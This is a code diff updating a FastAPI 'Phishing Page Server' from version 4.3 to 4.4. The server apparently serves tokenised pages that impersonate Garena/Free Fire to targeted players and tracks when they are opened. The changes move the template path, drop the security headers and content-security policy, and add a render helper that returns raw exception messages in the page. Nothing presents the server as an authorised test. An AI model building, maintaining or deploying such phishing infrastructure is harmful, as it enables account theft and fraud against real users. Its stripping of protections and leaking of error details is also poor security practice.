@@ -1,5 +1,5 @@
 """
-FastAPI Phishing Page Server — Secure v4.3
+FastAPI Phishing Page Server — Secure v4.4
 Production-hardened, cloud-ready.
 """
 
@@ -83,13 +83,15 @@ except Exception as e:
 # ═══════════════════════════════════════════════════
 app = FastAPI(
     title="Phishing Page Server",
-    version="4.3",
+    version="4.4",
     docs_url=None,
     redoc_url=None,
     openapi_url=None,
 )
 
-templates = Jinja2Templates(directory="templates")
+# Chemin absolu pour les templates (évite les problèmes de working directory)
+TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
+templates = Jinja2Templates(directory=TEMPLATES_DIR)
 
 # CORS
 _cors_env = os.environ.get(
@@ -340,21 +342,19 @@ def _find_page_by_id(page_id: str):
     return None, None
 
 # ═══════════════════════════════════════════════════
-# SECURITY HEADERS HELPER
+# TEMPLATE RENDER HELPER (avec try/except pour debug)
 # ═══════════════════════════════════════════════════
-_html_headers = {
-    "X-Content-Type-Options": "nosniff",
-    "X-Frame-Options": "DENY",
-    "X-XSS-Protection": "1; mode=block",
-    "Referrer-Policy": "strict-origin-when-cross-origin",
-    "Permissions-Policy": "camera=(), microphone=(), geolocation=()",
-}
-
-_api_headers = {
-    "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
-    "Pragma": "no-cache",
-    "Expires": "0",
-}
+def _render_page(request: Request, **kwargs):
+    """Render template avec gestion d'erreur et log."""
+    try:
+        return templates.TemplateResponse("phishing.html", {"request": request, **kwargs})
+    except Exception as e:
+        logger.error("Template render error: %s", str(e))
+        # Fallback minimal si le template plante
+        return HTMLResponse(
+            content=f"<html><body><h1>Error</h1><p>Failed to render page: {str(e)}</p></body></html>",
+            status_code=500
+        )
 
 # ═══════════════════════════════════════════════════
 # ENDPOINTS
@@ -367,21 +367,13 @@ async def serve_phishing_page(request: Request, uid: str, garena: Optional[str] 
 
     if not garena:
         _log_request(request, "serve_page", status="error", extra={"reason": "missing_garena"})
-        return templates.TemplateResponse(
-            "phishing.html",
-            {"request": request, "valid_page": False, "error_message": "Invalid request parameters.",
-             "page_id": "", "session_token": "", "username": "", "game_id": "", "email": "", "has_username_id": False},
-            headers=_html_headers
-        )
+        return _render_page(request, valid_page=False, error_message="Invalid request parameters.",
+                            page_id="", session_token="", username="", game_id="", email="", has_username_id=False)
 
     if db is None:
         _log_request(request, "serve_page", status="error", extra={"reason": "db_unavailable"})
-        return templates.TemplateResponse(
-            "phishing.html",
-            {"request": request, "valid_page": False, "error_message": "Service temporarily unavailable. Please check configuration.",
-             "page_id": "", "session_token": "", "username": "", "game_id": "", "email": "", "has_username_id": False},
-            headers=_html_headers
-        )
+        return _render_page(request, valid_page=False, error_message="Service temporarily unavailable. Please check configuration.",
+                            page_id="", session_token="", username="", game_id="", email="", has_username_id=False)
 
     provided_hash = _hash_token(garena)
     try:
@@ -405,12 +397,8 @@ async def serve_phishing_page(request: Request, uid: str, garena: Optional[str] 
 
     if not page_data:
         _log_request(request, "serve_page", status="error", extra={"reason": "page_not_found", "uid": uid})
-        return templates.TemplateResponse(
-            "phishing.html",
-            {"request": request, "valid_page": False, "error_message": "Oops, page not found.",
-             "page_id": "", "session_token": "", "username": "", "game_id": "", "email": "", "has_username_id": False},
-            headers=_html_headers
-        )
+        return _render_page(request, valid_page=False, error_message="Oops, page not found.",
+                            page_id="", session_token="", username="", game_id="", email="", has_username_id=False)
 
     if _is_session_expired(page_data):
         if page_data.get("status") == "active":
@@ -419,21 +407,13 @@ async def serve_phishing_page(request: Request, uid: str, garena: Optional[str] 
             except Exception as e:
                 logger.error("Failed to mark page expired: %s", str(e))
         _log_request(request, "serve_page", status="error", extra={"reason": "expired", "page_id": page_id})
-        return templates.TemplateResponse(
-            "phishing.html",
-            {"request": request, "valid_page": False, "error_message": "This page has expired.",
-             "page_id": "", "session_token": "", "username": "", "game_id": "", "email": "", "has_username_id": False},
-            headers=_html_headers
-        )
+        return _render_page(request, valid_page=False, error_message="This page has expired.",
+                            page_id="", session_token="", username="", game_id="", email="", has_username_id=False)
 
     if page_data.get("status") not in ["active", "stopped", "verified"]:
         _log_request(request, "serve_page", status="error", extra={"reason": "invalid_status", "page_id": page_id})
-        return templates.TemplateResponse(
-            "phishing.html",
-            {"request": request, "valid_page": False, "error_message": "This page is no longer available.",
-             "page_id": "", "session_token": "", "username": "", "game_id": "", "email": "", "has_username_id": False},
-            headers=_html_headers
-        )
+        return _render_page(request, valid_page=False, error_message="This page is no longer available.",
+                            page_id="", session_token="", username="", game_id="", email="", has_username_id=False)
 
     try:
         current_count = page_data.get("open_count", 0)
@@ -452,21 +432,10 @@ async def serve_phishing_page(request: Request, uid: str, garena: Optional[str] 
 
     _log_request(request, "serve_page", page_id=page_id, status="success")
 
-    headers = dict(_html_headers)
-    headers["Content-Security-Policy"] = (
-        "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; "
-        "img-src 'self' https://dl.dir.freefiremobile.com data:; font-src 'self'; connect-src 'self'; "
-        "frame-ancestors 'none'; base-uri 'self'; form-action 'self';"
-    )
-
-    return templates.TemplateResponse(
-        "phishing.html",
-        {"request": request, "valid_page": True, "error_message": None,
-         "page_id": page_id, "session_token": garena, "username": username,
-         "game_id": game_id, "email": _mask_email(email) if not has_username_id else "",
-         "has_username_id": has_username_id},
-        headers=headers
-    )
+    return _render_page(request, valid_page=True, error_message=None,
+                        page_id=page_id, session_token=garena, username=username,
+                        game_id=game_id, email=_mask_email(email) if not has_username_id else "",
+                        has_username_id=has_username_id)
 
 
 @app.post("/phishing/pages/track-open")
@@ -666,7 +635,7 @@ async def reset_verification(request: Request, data: ResetVerificationRequest):
 
 @app.get("/")
 async def root():
-    return {"message": "Phishing Page Server v4.3 running.", "status": "healthy"}
+    return {"message": "Phishing Page Server v4.4 running.", "status": "healthy"}
 
 
 @app.get("/health")
@@ -674,7 +643,7 @@ async def health_check():
     db_ok = db is not None
     return {
         "status": "healthy" if db_ok else "degraded",
-        "version": "4.3",
+        "version": "4.4",
         "database": "connected" if db_ok else "disconnected",
         "timestamp": datetime.now(timezone.utc).isoformat(),
     }
